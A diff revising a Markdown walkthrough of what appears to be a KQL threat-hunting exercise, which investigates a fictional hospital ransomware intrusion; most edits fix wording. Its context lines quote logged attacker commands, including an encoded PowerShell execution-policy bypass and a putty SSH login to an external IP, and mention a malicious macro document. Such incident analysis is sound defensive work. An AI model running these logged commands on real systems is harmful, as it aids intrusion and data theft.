@@ -214,7 +214,7 @@ ProcessEvents
 | 2024-03-01T13:47:48Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc SW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICRTZXJ2ZXIgLUNsYXNzIENDTV9Tb2Z0d2FyZVVwZGF0ZXNNYW5hZ2VyIC1OYW1lIEluc3RhbGxVcGRhdGVzIC0gQXJndW1lbnRMaXN0ICgsICRQZW5kaW5nVXBkYXRlTGlzdCkgLU5hbWVzcGFjZSByb290WyZjY20mXWNsaWVudHNkayB8IE91dC1OdWxs" | powershell.exe    | 5077a3f88ccbe31da491d3b6607a66499c7d8b0356aaa12e5c13eb419745fde3 | M8D0-MACHINE | mehudgens  |
 | 2024-03-01T13:55:11Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 131.92.62.82 -l have_ya_tried -pw turning_it_off_and_on_again                                                                                  | cmd.exe           | 934528d9f8f2b32937aa85254b09dbaeed2d0653f25c56d078643a836674f838 | M8D0-MACHINE | mehudgens  |
 
-I decoded the Base64, and the output was 'Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&ccm&]clientsdk | Out-Null'. Unfortunately, it doesn't seem to be especially interesting to our investigation: I think its invoking a method on a remote server to install software udpates using Microsoft's System Center Configuration Manager (SCCM). Moving on, we see 7zip (7z.exe) encrypting files with database file extensions.
+I decoded the Base64, and the output was 'Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&ccm&]clientsdk | Out-Null'. Unfortunately, it doesn't seem to be especially interesting to our investigation: I think its invoking a method on a remote server to install software updates using Microsoft's System Center Configuration Manager (SCCM). Moving on, we see 7zip (7z.exe) encrypting files with database file extensions.
 
 
 putty.exe is launched, with the arguments '-ssh 131.92.62.82 -l have_ya_tried -pw turning_it_off_and_on_again'.
@@ -305,7 +305,8 @@ InboundNetworkEvents
 | where url contains "erp"
 ```
 
-(results truncated):
+(Results truncated):
+
 | Timestamp           | Method | Source IP       | User Agent                                                                                       | URL                                                                                                                       | Status Code |
 |---------------------|--------|-----------------|--------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------|-------------|
 | 2024-03-01T11:16:22Z | GET    | 135.103.59.74   | Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00                                       | https://azurecresthospital.med/search=Azure+crest+ERP+systems                                                             | 200         |
@@ -359,7 +360,9 @@ FileCreationEvents
 ```
 
 On 2024-03-04, we see the same pattern of files dropped as before. Then, nothing happens until the first of the following month...
-(results truncated):
+
+(Results truncated):
+
 | Timestamp           | Hostname              | Username    | SHA256                                                           | Path                                      | Filename                    | Process Name   |
 |---------------------|-----------------------|-------------|-------------------------------------------------------------------|-------------------------------------------|------------------------------|----------------|
 | 2024-04-01T14:40:15Z | SUPER-DB-SERVER-9000  | rotrenneman | b68cc52498669a77a05b458299b732076ce1bbfbef75b11f8d8f46f50b5809a2  | C:\Out                                   | Out                          | explorer.exe   |
@@ -395,7 +398,7 @@ What password was used to encrypt the archive containing the financial database 
 
 ---
 
-Since we know the ransomware waited until the first of the month, let's see what happens in the process events table, beginning the prior day:
+Since we know the ransomware waited until the first of the month to execute from the results of the query in question 10, let's see what happens in the process events table, beginning the prior day:
 
 ```
 ProcessEvents
@@ -436,7 +439,7 @@ What domain was used to target the employee that held the keys to the database?
 
 ---
 
-Given the query results in question 10, we know Roy downloaded 'New_Healthcare_Protocols.docm'. We also have his email from the query results in question 1: roy_trenneman@azurecresthospital.med. Given this information, let's query the Emails table:
+Given the query results in question 10, we know Roy launched the malicious document 'New_Healthcare_Protocols.docm'. We also have his email from the query results in question 1: 'roy_trenneman@azurecresthospital.med'. Given this information, let's query the Emails table:
 
 ```
 Email
